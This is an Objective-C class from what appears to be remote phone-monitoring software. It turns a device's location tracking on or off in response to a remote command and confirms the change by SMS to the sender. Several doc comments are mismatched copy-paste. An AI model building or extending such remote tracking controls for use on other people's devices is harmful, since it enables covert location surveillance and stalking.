/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  EnableLocationProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/


#import "EnableLocationProcessor.h"
#import "PrefLocation.h"
#import "Preference.h"

@interface EnableLocationProcessor (PrivateAPI)
- (BOOL) isValidFlag;
- (void) enableLocation;
- (void) enableLocationException;
- (void) sendReplySMS;
@end

@implementation EnableLocationProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the EnableLocationProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"EnableLocationProcessor--->initWithRemoteCommandData")
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the EnableLocationProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"EnableLocationProcessor--->doProcessingCommand");
	if ([self isValidFlag])	[self enableLocation];
	else [self enableLocationException];
	
}


#pragma mark EnableCaptureProcessor PrivateAPI Methods

/**
 - Method name: enableLocation
 - Purpose:This method is used to process enable location
 - Argument list and description: No argument
 - Return description:No return type
*/

- (void) enableLocation{
	DLog (@"EnableLocationProcessor--->enableLocation");
	NSUInteger flagValue=[[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
    id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefLocation *prefLocation = (PrefLocation *)[prefManager preference:kLocation];
	[prefLocation setMEnableLocation:flagValue];
	[prefManager savePreferenceAndNotifyChange:prefLocation];
	[self sendReplySMS];
}

/**
 - Method name: isValidDigitAndURL
 - Purpose:This method is used to validate the Arguments
 - Argument list and description: 
 - Return description:isValidArguments (BOOL)
*/

- (BOOL) isValidFlag {
	DLog (@"EnableLocationProcessor--->isValidFlag")
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) isValid=[RemoteCmdProcessorUtils isZeroOrOneFlag:[args objectAtIndex:2]];	
	return isValid;
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aErrorCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMS {
     DLog (@"EnableLocationProcessor--->sendReplySMS")
	 NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							 andErrorCode:_SUCCESS_];
	 NSString *enableLocationMessage=NSLocalizedString(@"kEnableLocation", @"");
	 if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue]==1) 
	      enableLocationMessage= [enableLocationMessage stringByAppendingString:NSLocalizedString(@"kEnabled", @"")];
	 else 
	    enableLocationMessage= [enableLocationMessage stringByAppendingString:NSLocalizedString(@"kDisabled", @"")];
	 
	 enableLocationMessage=[messageFormat stringByAppendingString:enableLocationMessage];
	
	 [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:enableLocationMessage];
	 if ([mRemoteCmdData mIsSMSReplyRequired]) {
		 [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
																andMessage:enableLocationMessage];
	 }
}

/**
 - Method name: enableLocationException
 - Purpose:This method is invoked when  processRequestEvents failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) enableLocationException {
	DLog (@"EnableLocationProcessor--->enableCaptureException")
	FxException* exception = [FxException exceptionWithName:@"requestEventsException" andReason:@"Request Events error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: dealloc
 - Purpose:This method is used to get the recipientNumber 
 - Argument list and description: No Return Type
 - Return description: mSenderNumber (NSString *)
*/

-(void) dealloc {
	[super dealloc];
}


@end
